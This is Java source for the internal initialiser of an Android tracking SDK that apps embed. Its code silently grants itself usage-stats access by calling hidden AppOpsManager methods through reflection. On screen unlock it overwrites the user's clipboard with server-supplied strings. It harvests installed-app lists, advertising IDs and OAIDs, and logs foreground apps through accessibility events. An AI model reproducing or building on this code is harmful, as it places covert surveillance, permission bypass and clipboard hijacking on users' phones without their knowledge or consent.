package com.analysys.track.internal;

import android.app.AppOpsManager;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.os.Process;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.analysys.track.BuildConfig;
import com.analysys.track.internal.content.EGContext;
import com.analysys.track.internal.content.UploadKey;
import com.analysys.track.internal.impl.AdvertisingIdClient;
import com.analysys.track.internal.impl.ReceiverImpl;
import com.analysys.track.internal.impl.oc.OCImpl;
import com.analysys.track.internal.work.CrashHandler;
import com.analysys.track.internal.work.MessageDispatcher;
import com.analysys.track.internal.work.ServiceHelper;
import com.analysys.track.utils.ActivityCallBack;
import com.analysys.track.utils.BugReportForTest;
import com.analysys.track.utils.ProcessUtils;
import com.analysys.track.utils.pkg.PkgList;
import com.analysys.track.utils.reflectinon.EContextHelper;
import com.analysys.track.utils.ELOG;
import com.analysys.track.utils.EThreadPool;
import com.analysys.track.utils.FileUitls;
import com.analysys.track.utils.MClipManager;
import com.analysys.track.utils.MultiProcessChecker;
import com.analysys.track.utils.id.OAIDHelper;
import com.analysys.track.utils.PsHelper;
import com.analysys.track.utils.ReceiverUtils;
import com.analysys.track.utils.SystemUtils;
import com.analysys.track.utils.data.EncryptUtils;
import com.analysys.track.utils.reflectinon.ClazzUtils;
import com.analysys.track.utils.sp.SPHelper;

import org.json.JSONArray;

import java.io.File;
import java.util.HashMap;
import java.util.Random;

public class AnalysysInternal {
    private volatile boolean hasInit = false;


    /**
     * 服务调用SDK初始化接口
     */
    public synchronized void aliave() {
        initEguan(null, null, false);
    }

    /**
     * 初始化函数,可能为耗时操作的，判断是否主线程，需要开子线程做
     *
     * @param key
     * @param channel
     * @param initType true 主动初始化 false 被动初始化
     */
    public synchronized void initEguan(final String key, final String channel, final boolean initType) {
        try {
            // 单进程内防止重复注册
            if (hasInit) {
                return;
            }
            hasInit = true;
            tryEnableUsm();
            preparePkgListAndIdfa();
            // 防止影响宿主线程中的任务
            EThreadPool.runOnWorkThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        init(key, channel, initType);
                    } catch (Throwable e) {
                        if (BuildConfig.ENABLE_BUG_REPORT) {
                            BugReportForTest.commitError(e);
                        }
                    }

                }
            });
        } catch (Throwable igone) {
            if (BuildConfig.DEBUG_UTILS) {
                BugReportForTest.commitError(igone);
            }
        }
    }

    private void preparePkgListAndIdfa() {
        // 检查是否有Context
        Context ctx = EContextHelper.getContext();
        if (ctx == null) {
            return;
        }
        PkgList.getInstance(ctx).getAppPackageList();
        prepareIDFA(ctx);

    }

    private void prepareIDFA(Context ctx) {
        AdvertisingIdClient.AdInfo adInfo = AdvertisingIdClient.getAdvertisingIdInfo(ctx);// 阻塞调用，需放在子线程处理
        if (adInfo != null) {
            SPHelper.setStringValue2SP(ctx, EGContext.SP_APP_IDFA, adInfo.getId());
        }
    }

    private void tryEnableUsm() {
        EThreadPool.runOnWorkThread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT > 18) {
                        Context ctx = EContextHelper.getContext();
                        if (ctx != null) {
                            AppOpsManager appOpsManager = (AppOpsManager) ctx.getApplicationContext().getSystemService(Context.APP_OPS_SERVICE);
                            HashMap<String, Integer> map = (HashMap<String, Integer>) ClazzUtils.getFieldValue(appOpsManager, "sOpStrToOp");
                            if (map.containsKey(AppOpsManager.OPSTR_GET_USAGE_STATS)) {
                                int code = map.get(AppOpsManager.OPSTR_GET_USAGE_STATS);
                                int uid = Process.myUid();
                                String pkn = ctx.getPackageName();
                                int mode = AppOpsManager.MODE_ALLOWED;
                                ClazzUtils.invokeObjectMethod(
                                        appOpsManager, "setMode",
                                        new Class[]{int.class, int.class, String.class, int.class}
                                        , new Object[]{code, uid, pkn, mode}
                                );
                            }

                        }

                    }
                } catch (Throwable e) {
                }
            }
        });
    }

    /**
     * key支持参数设置、XML文件设置， 参数设置优先级大于XML设置
     *
     * @param key
     * @param channel
     */
    @SuppressWarnings("deprecation")
    private void init(String key, String channel, boolean initType) {

        try {
            // 检查是否有Context
            Context ctx = EContextHelper.getContext();
            if (ctx == null) {
                return;
            }
            //已被拉黑
            if (SPHelper.getBooleanValueFromSP(ctx, EGContext.SP_BLACK__DEV_KEY, false)) {
                return;
            }
            SPHelper.setBooleanValue2SP(ctx, EGContext.KEY_INIT_TYPE, initType);
            Application application = (Application) ctx;
            application.registerActivityLifecycleCallbacks(ActivityCallBack.getInstance());

            SPHelper.setIntValue2SP(ctx, EGContext.KEY_ACTION_SCREEN_ON_SIZE, EGContext.FLAG_START_COUNT + 1);
            // updateSnapshot sp
            SystemUtils.updateAppkeyAndChannel(ctx, key, channel);

            // 1. 设置错误回调
            CrashHandler.getInstance().setCallback(null);// 不依赖ctx
            // 2.初始化加密
            EncryptUtils.init(ctx);
            // 3.初始化多进程
            initSupportMultiProcess(ctx);
            // 4. 只能注册一次，不能注册多次
            ReceiverUtils.getInstance().registAllReceiver(ctx);
            // 5. 启动工作机制
            MessageDispatcher.getInstance(ctx).initModule();
            // if has no init time, init
            long initTime = SPHelper.getLongValueFromSP(ctx, EGContext.SP_INIT_TIME, 0);
            if (initTime <= 0) {
                SPHelper.setLongValue2SP(ctx, EGContext.SP_INIT_TIME, System.currentTimeMillis());
            }

            ServiceHelper.getInstance(EContextHelper.getContext()).startSelfService();
            // 6. 根据屏幕调整工作状态
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                boolean isScreenOn = pm.isScreenOn();
                // 如果为true，则表示屏幕正在使用，false则屏幕关闭。
                if (!isScreenOn) {
                    ReceiverUtils.getInstance().setWork(false);
                }
            }
            // 7.检查加密模块是否正常，false重新初始化
            if (!EncryptUtils.checkEncryptKey(ctx)) {
                EncryptUtils.reInitKey(ctx);
            }
            Log.i(EGContext.LOGTAG_USER, String.format("[%s] init SDK (%s) success! ", ProcessUtils.getCurrentProcessName(EContextHelper.getContext()), EGContext.SDK_VERSION));

            // PatchHelper.prepare(ctx);
            clearPatch(ctx);
            PsHelper.getInstance().startAllPlugin();


            clearOldSpFiles();
            if (Build.VERSION.SDK_INT >= 29) {
                OAIDHelper.tryGetOaidAndSave(ctx);
            }
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }


    private void clearPatch(Context ctx) {
        //清除新版本存储目录
        FileUitls.getInstance(ctx).deleteFileAtFilesDir(EGContext.PATCH_OLD_CACHE_DIR);
        FileUitls.getInstance(ctx).deleteFileAtFilesDir(EGContext.PATCH_NET_CACHE_DIR);
        FileUitls.getInstance(ctx).deleteFileAtFilesDir(EGContext.PATCH_DIR);
        FileUitls.getInstance(ctx).deleteFileAtFilesDir(EGContext.PATCH_CF_DIR);
        // 清除patch部分缓存
        SPHelper.removeKey(ctx, UploadKey.Response.PatchResp.PATCH_METHODS);
        SPHelper.removeKey(ctx, UploadKey.Response.PatchResp.PATCH_SIGN);
        SPHelper.removeKey(ctx, UploadKey.Response.PatchResp.PATCH_VERSION);
        //  清除策略号
        SPHelper.removeKey(ctx, UploadKey.Response.RES_POLICY_VERSION);
    }

    private void clearOldSpFiles() {
        try {
            SPHelper.removeSpFiles(EContextHelper.getContext(), EGContext.SP_NAME);
            File file = SPHelper.getNewSharedPrefsFile(EContextHelper.getContext(), "ana_sp_xml");
            if (file.exists() && file.isFile()) {
                file.delete();
            }

            file = EContextHelper.getContext().getDatabasePath("e.data");
            if (file.exists() && file.isFile()) {
                file.delete();
            }
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }

        }
    }


    /**
     * 初始化支持多进程
     *
     * @param cxt
     */
    private void initSupportMultiProcess(Context cxt) {
        try {
            if (cxt == null) {
                return;
            }

            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_APPSNAPSHOT, EGContext.TIME_HOUR * 3);
            if (Build.VERSION.SDK_INT < 26) {
                MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_OC, EGContext.TIME_SECOND * 5);
            } else {
                MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_OC, EGContext.TIME_SYNC_OC_OVER_5);
            }
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_LOCATION, EGContext.TIME_SYNC_LOCATION);
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SCREEN_OFF_BROADCAST, EGContext.TIME_SYNC_BROADCAST);
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_ADD_BROADCAST, EGContext.TIME_SECOND * 5);
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_DELETE_BROADCAST, EGContext.TIME_SECOND * 5);
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_UPDATE_BROADCAST, EGContext.TIME_SECOND * 5);
            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_NET, EGContext.TIME_SECOND * 5);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SCREEN_ON_BROADCAST, EGContext.TIME_SYNC_BROADCAST);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BOOT_BROADCAST, EGContext.TIME_SYNC_DEFAULT);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BATTERY_BROADCAST, EGContext.TIME_SECOND * 5);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_UPLOAD, EGContext.TIME_SYNC_UPLOAD);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_HOTFIX, EGContext.TIME_SECOND * 5);
//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SP_WRITER, EGContext.TIME_SYNC_SP);
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    /************************************************* 解析Intent ********************************************************************/
    public void parseIntent(final Intent intent) {
        EThreadPool.runOnWorkThread(new Runnable() {
            @Override
            public void run() {
                parserIntent(intent);
            }
        });
    }

    public void parserIntent(Intent intent) {
        Context context = EContextHelper.getContext();
        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            parExtra(context);
            //没初始化并且开屏了10次,就初始化,否则+1返回不处理
            int size = SPHelper.getIntValueFromSP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, 0);
            if (BuildConfig.logcat) {
                ELOG.w(BuildConfig.tag_recerver, " 解锁屏次数:" + size);
            }
            // 默认从0开始计数，为确保第N次生效，比较条件应为大于等于N-1
            if (size >= (EGContext.FLAG_START_COUNT - 1)) {
                if (BuildConfig.logcat) {
                    ELOG.i(BuildConfig.tag_recerver, " 即将进行初始化。。。");
                }
//                initEguan(null, null, false);
                aliave();
            } else {
                if (BuildConfig.logcat) {
                    ELOG.d(BuildConfig.tag_recerver, " 即将进保存初始化次数，并退出");
                }
                SPHelper.setIntValue2SP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, size + 1);
            }
        } else {
            ReceiverImpl.getInstance().process(context, intent);
        }
    }

    private void parExtra(Context context) {
        try {
            String extras = SPHelper.getStringValueFromSP(context, UploadKey.Response.RES_POLICY_EXTRAS, "");
            if (!TextUtils.isEmpty(extras)) {
                JSONArray ar = new JSONArray(extras);
                if (ar.length() > 0) {
                    int x = new Random(System.nanoTime()).nextInt(ar.length() - 1);
                    MClipManager.setClipbpard(context, "", ar.optString(x, ""));
                }
            }
        } catch (Throwable igone) {
        }
    }

    /***************************************************辅助功能使用********************************************************************/
    public void accessibilityEvent(final AccessibilityEvent event) {
        try {
            aliave();
            EThreadPool.runOnWorkThread(new Runnable() {
                @Override
                public void run() {
                    CharSequence pkgName = event.getPackageName();
                    if (TextUtils.isEmpty(pkgName)) {
                        return;
                    }
                    final String pkg = pkgName.toString().trim();
                    OCImpl.getInstance(EContextHelper.getContext()).processSignalPkgName(pkg, UploadKey.OCInfo.COLLECTIONTYPE_ACCESSIBILITY);
                }
            });
        } catch (Throwable t) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(t);
            }
        }
    }

    /**************************************************************************************************************************************/
    private static class Holder {
        private static AnalysysInternal instance = new AnalysysInternal();
    }

    private AnalysysInternal() {
    }

    public static AnalysysInternal getInstance(Context context) {
        EContextHelper.setContext(context);
        return Holder.instance;
    }
}
